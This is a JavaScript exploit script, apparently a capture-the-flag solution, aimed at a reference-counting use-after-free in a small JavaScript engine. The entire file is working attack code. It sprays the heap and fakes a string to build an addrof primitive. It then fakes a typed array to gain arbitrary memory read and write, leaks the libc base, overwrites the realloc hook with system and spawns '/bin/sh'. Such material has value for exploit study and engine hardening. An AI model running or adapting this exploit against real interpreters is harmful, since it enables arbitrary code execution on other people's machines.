// Binary helper functions, borrowed from @itszn
var Binary = (function() {
  let memory = new ArrayBuffer(8);
  let view_u8 = new Uint8Array(memory);
  let view_u32 = new Uint32Array(memory);
  let view_f64 = new Float64Array(memory);

  return {
    view_u8: view_u8,
    view_u32: view_u32,
    view_f64: view_f64,
    str_to_f64: (str) => {
        for (let i = 0; i < 8; i++)
            view_u8[i] = str.charCodeAt(i)|0;
        return view_f64[0];
    },
    i64_to_f64: (i64) => {
      view_u32[0] = i64.low;
      view_u32[1] = i64.high;
      return view_f64[0];
    },
    i32_to_u32: (i32) => {
      // needed because 0xffffffff -> -1 as an int
      view_u32[0] = i32;
      return view_u32[0];
    }
  }
})();

// Simple Int64 class
class Int64 { 
  constructor(high, low) {
    if (low === undefined) {
      this.high = 0;
      this.low = high;
    } else {
      this.high = high;
      this.low = low;
    }
  }
  toString() {
    // Return as hex string
    return '0x'+Binary.i32_to_u32(this.high)
        .toString(16).padStart(8,'0') +
    Binary.i32_to_u32(this.low)
        .toString(16).padStart(8,'0');
  }
  _add_inplace(high, low) {
    let tmp = Binary.i32_to_u32(this.low) + Binary.i32_to_u32(low);
    this.low = tmp & 0xffffffff;
    let carry = (tmp > 0xffffffff)|0;
    this.high = (this.high + high + carry) & 0xffffffff;
    return this;
  }
  add_inplace(v) {
    if (v instanceof Int64)
      return this._add_inplace(v.high, v.low);
    return this._add_inplace(0, v);
  }
  add(v) {
    let res = new Int64(this.high, this.low);
    return res.add_inplace(v);
  }
  _sub_inplace(high, low) {
    // Add with two's compliment
    this._add_inplace(~high, ~low)._add_inplace(0, 1);
    return this
  }
  sub_inplace(v) {
    if (v instanceof Int64)
      return this._sub_inplace(v.high, v.low);
    return this._sub_inplace(0, v);
  }
  sub(v) {
    let res = new Int64(this.high, this.low);
    return res.sub_inplace(v);
  }
}

class Heapspray {
    constructor(pattern, chunksizes, amount) {
        this.pattern = pattern;
        this.spraybuf = [];
        for (const chunksize of chunksizes) {
            this.spraybuf[chunksize] = [];
            for (let n = 0; n < amount; n++) {
                this.spraybuf[chunksize].push(1.1);
            }
        }
    }
    spray() {
        for (const chunksize in this.spraybuf) {
            for (let n = 0; n < this.spraybuf[chunksize].length; n++) {
                this.spraybuf[chunksize][n] = this.pattern.slice(0, chunksize);
            }
        }
    }
}

function sploit() {
    var patternA = 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
    var patternB = 'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
    
    var basespray = new Heapspray(patternA, [0x7, 0x17, 0x27, 0x37, 0x47, 0x57, 0x67, 0x77], 20);
    var ctrlspray = new Heapspray(patternB, [0x37], 10);
    var pwn, trash, ref1, ref2;

    var tmp, x, y, z, i, j;
    var pwn_list;
    basespray.spray();
    ctrlspray.spray();
    
    /* shape the heap so pwn js object is right above wilderness */
    pwn_list = [];
    /*
    basespray.spraybuf[0x17][0] = 1.1;
    basespray.spraybuf[0x27][0] = 1.1;
    basespray.spraybuf[0x27][1] = 1.1;
    basespray.spraybuf[0x27][2] = 1.1;
    basespray.spraybuf[0x37][0] = 1.1;
    basespray.spraybuf[0x37][1] = 1.1;
    basespray.spraybuf[0x37][2] = 1.1;
    ctrlspray.spraybuf[0x37][9] = 1.1;
    basespray.spraybuf[0x37][3] = 1.1;
    */
    pwn = {};
    
    /* bug. ref1 and ref2 hold a reference of pwn, gc refcnt is 1 */
    pwn.valueOf = function() {
        ref1 = pwn;
        ref2 = pwn;
        pwn = 0;
    }
    pwn += 0;
    
    /* x is now a dangling js str pointer */
    ref1 = 0;
    trash = patternB.slice(0, 0x37);
    x = patternA.slice(0, 0x37);
    y = x;
    ref2 = 0;
    y = 0;
    
    /* data section of typed array will fake a js string. */
    basespray.spraybuf[0x17][1] = 1.1;
    basespray.spraybuf[0x37][4] = 1.1;
    z = new Uint32Array(0x48 / 4);
    z[0] = 0xff;
    z[1] = 0x10000;
    
    /* check fake str */
    console.log(x.length === z[1]);
    
    /* create property array placed right after x */
    for (i = 0; i < 4; i++)
        pwn_list.push(pwn);
    
    /* dynamically locate offset */
    trash = 0;
    pwn_list[0] = 0xdead;
    while(trash < x.length) {
        for (i = 0; i < 8; i++)
            Binary.view_u8[i] = x.charCodeAt(trash + i);
        if (new Int64(Binary.view_u32[1], Binary.view_u32[0]) == 0xdead)
            break;
        trash += 8;
    }
    console.log(trash);
    
    /* addrof by reading property array with fake str x */
    var addrof = function(obj) {
        pwn_list[0] = obj;
        for (i = 0; i < 8; i++)
            Binary.view_u8[i] = x.charCodeAt(trash + i);
        pwn_list[0] = 0;
        return new Int64(Binary.view_u32[1], Binary.view_u32[0]);
    }
    
    /* check addrof */
    console.log(addrof(0x1337) == 0x1337);
    
    /* bug again. this time we want a controllable js object */
    pwn = {};
    pwn.valueOf = function() {
        ref1 = pwn;
        ref2 = pwn;
        pwn = 0;
    }
    pwn += 0;
    
    /* ref2 is dangling obj ptr into y's data section */
    ref1 = 0;
    //basespray.spraybuf[0x37][5] = 1.1;
    y = new Uint32Array(0x48 / 4);
    
    /* lets just fake a typed uint8 array, fast array flag is set */
    y.fill(0x88888888);
    y[0] = 0x000000ff;
    y[1] = 0x00171000;
    
    /* arbitrary r/w by modifying y's typed array data ptr :) */
    var readfrom = function(addr) {
        y[14] = addr.low;
        y[15] = addr.high;
        for (i = 0; i < 8; i++)
            Binary.view_u8[i] = ref2[i];
        return new Int64(Binary.view_u32[1], Binary.view_u32[0]);
    }
    var writeto = function(addr, value) {
        y[14] = addr.low;
        y[15] = addr.high;
        Binary.view_u32[0] = value.low;
        Binary.view_u32[1] = value.high;
        for (i = 0; i < 8; i++)
            ref2[i] = Binary.view_u8[i];
    }
    
    /* check r/w primitive */
    tmp = "BBBBAAAA";
    console.log(readfrom(addrof(tmp).add_inplace(0x10)) == 0x4141414142424242);
    writeto(addrof(tmp).add_inplace(0x10), new Int64(0x43434343, 0x44444444));
    console.log(tmp === "DDDDCCCC");
    
    /* libc specific offsets */
    
    /* leak libc base */
    tmp = new Uint8Array(0x800);
    j = readfrom(addrof(tmp).add_inplace(0x38));
    tmp = 0;
    var libc_base = readfrom(j).sub_inplace(0x3ebca0);
    console.log(libc_base);
    
    /* overwrite realloc hook with system */
    writeto(libc_base.add(0x3ebc28), libc_base.add(0x4f4e0));
    
    /* ayyyylmao */
    [Binary.str_to_f64("/bin/sh\0"), 0];
}

sploit();

